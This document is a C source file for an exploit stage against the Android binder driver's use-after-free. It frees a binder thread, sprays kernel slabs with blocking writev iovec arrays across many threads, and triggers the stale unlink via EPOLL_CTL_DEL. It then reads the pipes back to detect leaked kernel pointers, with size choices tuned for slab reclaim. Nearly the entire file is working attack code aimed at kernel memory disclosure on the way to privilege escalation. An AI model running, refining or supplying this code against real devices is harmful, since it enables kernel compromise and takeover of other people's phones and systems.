/*
 * pipe_readback_v2.c — Fixed pipe readback with proper data extraction
 *
 * Fix: Pre-fill pipe with 0xAA pattern. writev writes 0xBB pattern.
 * Read entire pipe after draining. Check if 0xBB region got corrupted
 * to kernel data by the list_del from EPOLL_CTL_DEL.
 *
 * Compile: aarch64-linux-musl-gcc -static -O2 -o pipe_readback_v2 pipe_readback_v2.c -lpthread
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <pthread.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/epoll.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <stdint.h>

#define BINDER_THREAD_EXIT  _IOW('b', 8, int32_t)
#define BINDER_VERSION      _IOWR('b', 9, struct { signed long protocol_version; })
#define BINDER_WRITE_READ   _IOWR('b', 1, struct binder_write_read)

struct binder_write_read {
    signed long write_size;
    signed long write_consumed;
    unsigned long write_buffer;
    signed long read_size;
    signed long read_consumed;
    unsigned long read_buffer;
};

#define BC_ENTER_LOOPER _IO('c', 13)

#define FILL_BYTE  0xAA  /* Pre-fill pattern */
#define MARK_BYTE  0xBB  /* writev marker pattern */

struct pipe_ctx {
    int rd;
    int wr;
    int n_iovecs;
    volatile int ready;
    ssize_t writev_result;
    int writev_errno;
};

static void *writev_worker(void *arg) {
    struct pipe_ctx *ctx = arg;

    /* Each iov entry writes 4 bytes of MARK_BYTE */
    struct iovec *iov = calloc(ctx->n_iovecs, sizeof(struct iovec));
    char *mark_bufs[64];

    for (int i = 0; i < ctx->n_iovecs && i < 64; i++) {
        mark_bufs[i] = malloc(4);
        memset(mark_bufs[i], MARK_BYTE, 4);
        iov[i].iov_base = mark_bufs[i];
        iov[i].iov_len = 4;
    }

    ctx->ready = 1;

    /* Blocks until pipe has space */
    ctx->writev_result = writev(ctx->wr, iov, ctx->n_iovecs);
    ctx->writev_errno = errno;

    for (int i = 0; i < ctx->n_iovecs && i < 64; i++) free(mark_bufs[i]);
    free(iov);
    return NULL;
}

/*
 * Read all data from pipe fd. Blocks until writer closes or EOF.
 */
static int drain_pipe(int fd, char *buf, int bufsize) {
    int total = 0;
    while (total < bufsize) {
        ssize_t r = read(fd, buf + total, bufsize - total);
        if (r <= 0) break;
        total += r;
    }
    return total;
}

static void run_test(int n_iovecs, int n_threads) {
    int iov_alloc_size = n_iovecs * 16;  /* sizeof(struct iovec) = 16 */
    printf("\n--- n_iovecs=%d (%d bytes), threads=%d ---\n", n_iovecs, iov_alloc_size, n_threads);

    pid_t pid = fork();
    if (pid < 0) return;

    if (pid == 0) {
        cpu_set_t cpuset;
        CPU_ZERO(&cpuset);
        CPU_SET(0, &cpuset);
        sched_setaffinity(0, sizeof(cpuset), &cpuset);

        /* Open binder */
        int bfd = open("/dev/binder", O_RDWR);
        if (bfd < 0) { printf("  binder open fail\n"); _exit(1); }
        void *bmap = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, bfd, 0);
        if (bmap == MAP_FAILED) { close(bfd); _exit(1); }

        struct { signed long protocol_version; } ver;
        ioctl(bfd, BINDER_VERSION, &ver);

        uint32_t cmd = BC_ENTER_LOOPER;
        struct binder_write_read bwr;
        memset(&bwr, 0, sizeof(bwr));
        bwr.write_size = sizeof(cmd);
        bwr.write_buffer = (unsigned long)&cmd;
        ioctl(bfd, BINDER_WRITE_READ, &bwr);

        /* Add to epoll */
        int epfd = epoll_create1(0);
        struct epoll_event ev = { .events = EPOLLIN, .data.fd = bfd };
        epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

        /* Free thread */
        ioctl(bfd, BINDER_THREAD_EXIT, NULL);
        printf("  thread freed\n");

        /* Create blocking writev threads */
        pthread_t *tids = calloc(n_threads, sizeof(pthread_t));
        struct pipe_ctx *ctxs = calloc(n_threads, sizeof(struct pipe_ctx));
        int ok_threads = 0;

        for (int i = 0; i < n_threads; i++) {
            int p[2];
            if (pipe(p) < 0) break;
            ctxs[i].rd = p[0];
            ctxs[i].wr = p[1];
            ctxs[i].n_iovecs = n_iovecs;
            ctxs[i].ready = 0;

            /* Fill pipe with FILL_BYTE */
            int fl = fcntl(p[1], F_GETFL);
            fcntl(p[1], F_SETFL, fl | O_NONBLOCK);
            char fb[4096];
            memset(fb, FILL_BYTE, sizeof(fb));
            while (write(p[1], fb, sizeof(fb)) > 0);
            fcntl(p[1], F_SETFL, fl);

            if (pthread_create(&tids[i], NULL, writev_worker, &ctxs[i]) != 0) break;
            ok_threads++;

            while (!ctxs[i].ready) usleep(100);
            usleep(2000);
        }
        printf("  %d threads blocking on writev\n", ok_threads);

        /* Trigger UAF: EPOLL_CTL_DEL */
        ev.events = EPOLLIN;
        epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, &ev);
        printf("  EPOLL_CTL_DEL done\n");

        /* Now drain each pipe and check the writev data portion */
        int leaks = 0;
        for (int i = 0; i < ok_threads; i++) {
            /* Close write end after joining thread will get the data */
            /* First: drain to unblock the writev */
            char *buf = malloc(131072);  /* 128KB */
            int fl = fcntl(ctxs[i].rd, F_GETFL);

            /* Non-blocking drain to unblock writev */
            fcntl(ctxs[i].rd, F_SETFL, fl | O_NONBLOCK);
            int drained = 0;
            for (int attempt = 0; attempt < 100; attempt++) {
                ssize_t r = read(ctxs[i].rd, buf + drained, 131072 - drained);
                if (r > 0) {
                    drained += r;
                } else {
                    usleep(1000);
                }
                if (drained >= 131072 - 4096) break;
            }

            /* Close write end → thread finishes → EOF on read end */
            close(ctxs[i].wr);
            pthread_join(tids[i], NULL);

            /* Read remaining data */
            fcntl(ctxs[i].rd, F_SETFL, fl);  /* blocking */
            while (drained < 131072) {
                ssize_t r = read(ctxs[i].rd, buf + drained, 131072 - drained);
                if (r <= 0) break;
                drained += r;
            }
            close(ctxs[i].rd);

            /* Analyze: find transition from FILL_BYTE to MARK_BYTE */
            int mark_start = -1;
            for (int j = 0; j < drained; j++) {
                if ((unsigned char)buf[j] != FILL_BYTE) {
                    mark_start = j;
                    break;
                }
            }

            if (mark_start < 0) {
                if (i == 0)
                    printf("  thread[%d]: all %d bytes are FILL (0x%02x) — writev data missing\n",
                           i, drained, FILL_BYTE);
                free(buf);
                continue;
            }

            /* Count marker bytes and non-marker/non-fill bytes in writev region */
            int markers = 0, alien = 0;
            int first_alien = -1;
            uint64_t alien_val = 0;

            for (int j = mark_start; j < drained; j++) {
                unsigned char b = (unsigned char)buf[j];
                if (b == MARK_BYTE) markers++;
                else if (b != FILL_BYTE) {
                    alien++;
                    if (first_alien < 0) {
                        first_alien = j - mark_start;
                        if (j + 8 <= drained)
                            memcpy(&alien_val, &buf[j], 8);
                    }
                }
            }

            int writev_bytes = n_iovecs * 4;  /* expected writev output */

            if (alien > 0) {
                leaks++;
                printf("\n  >>> ALIEN DATA in thread[%d]! <<<\n", i);
                printf("  writev region starts at byte %d\n", mark_start);
                printf("  expected %d marker bytes, got %d markers + %d ALIEN\n",
                       writev_bytes, markers, alien);
                printf("  first alien at writev offset +%d\n", first_alien);
                printf("  alien 8-byte value: 0x%016llx\n", (unsigned long long)alien_val);

                if ((alien_val & 0xFFFFFF0000000000ULL) == 0xffffffc000000000ULL ||
                    (alien_val & 0xFFFFFF0000000000ULL) == 0xffffff8000000000ULL)
                    printf("  >>> KERNEL POINTER! RECLAIM + UAF CONFIRMED! <<<\n");

                /* Hex dump */
                printf("  hex dump:\n  ");
                int ds = mark_start + (first_alien > 16 ? first_alien - 16 : 0);
                for (int j = ds; j < ds + 96 && j < drained; j++) {
                    printf("%02x ", (unsigned char)buf[j]);
                    if ((j - ds + 1) % 16 == 0) printf("\n  ");
                }
                printf("\n");
            } else {
                if (i < 3 || i == ok_threads - 1)
                    printf("  thread[%d]: writev at byte %d, %d/%d markers OK\n",
                           i, mark_start, markers, writev_bytes);
            }

            free(buf);
        }

        if (leaks > 0)
            printf("\n  >>> %d/%d THREADS LEAKED KERNEL DATA! <<<\n", leaks, ok_threads);
        else
            printf("  all %d threads: writev data clean (no corruption)\n", ok_threads);

        free(tids);
        free(ctxs);
        close(epfd);
        munmap(bmap, 4096);
        close(bfd);
        _exit(leaks > 0 ? 42 : 0);
    }

    alarm(60);
    int status;
    int wr = waitpid(pid, &status, 0);
    alarm(0);

    if (wr < 0) {
        printf("  TIMEOUT\n");
        kill(pid, SIGKILL);
        waitpid(pid, &status, 0);
    } else if (WIFEXITED(status)) {
        printf("  result: %s\n", WEXITSTATUS(status) == 42 ? "LEAK!" : "no leak");
    } else if (WIFSIGNALED(status)) {
        printf("  killed by signal %d\n", WTERMSIG(status));
    }
}

int main(void) {
    printf("=== PIPE READBACK v2 — Proper data extraction ===\n");
    printf("uid=%u\n", getuid());

    printf("\n=== kmalloc-512 (binder_thread = 304 bytes) ===\n");
    run_test(19, 128);   /* 304 bytes → kmalloc-512, exactly matching binder_thread */
    run_test(20, 128);   /* 320 bytes → kmalloc-512 */
    run_test(32, 128);   /* 512 bytes → kmalloc-512 */

    printf("\n=== kmalloc-256 (in case binder_thread is smaller) ===\n");
    run_test(16, 128);   /* 256 bytes → kmalloc-256 */
    run_test(12, 128);   /* 192 bytes → kmalloc-192 */

    printf("\n=== High spray count ===\n");
    run_test(19, 512);   /* 304 bytes, 512 threads for better reclaim odds */

    printf("\n=== DONE ===\n");
    return 0;
}
